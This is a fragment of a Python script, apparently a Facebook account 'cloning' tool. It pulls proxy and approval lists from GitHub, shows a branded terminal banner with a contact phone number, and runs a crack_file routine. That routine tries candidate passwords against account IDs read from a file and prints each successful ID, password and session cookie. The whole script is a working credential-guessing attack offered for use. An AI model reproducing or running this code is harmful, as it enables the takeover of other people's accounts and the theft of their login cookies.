...
princp=[]
try:
	prox= requests.get('https://github.com/JaberKing420/Api/blob/main/prox.txt').text
	open('.prox.txt','w').write(prox)
	
except Exception as e:
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mJABER')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/JABERbd71/Approved.txt/blob/main/Approved.txt').text
		ua=open('.bbnew.txt','w')
...
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[1;34m    : [★] JABER  ARMY\033[1;39m   ┃
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\033[1;34m      : [★] KING ARMY\033[1;39m          ┃
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\033[1;34m  : [★]𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\033[1;39m        ┃
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼??𝙎𝘼𝙋𝙋\033[1;34m    : [★]+8801852192547\033[1;39m     ┃
...
def login():
	banner()
	JABERj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	JABERj('\033[0;97m===============================================')
	JABER= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if JABER in ['m']:
		public()
	elif JABER in ['1']:
		crack_file()
...
def crack_file():
	...
	print('\033[1;32m [Put File Example:  /sdcard/JABER.txt  Etc...]')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#JABER-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•JABER-Cp] {idf} • {pw}\n\033[0;93[🤟]= COOKIES• \033[0;92m{kuki} ')     
				...
				#JABER-King
				print(f'\r\033[0;92m[JABER-OK ➼-OK😻] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
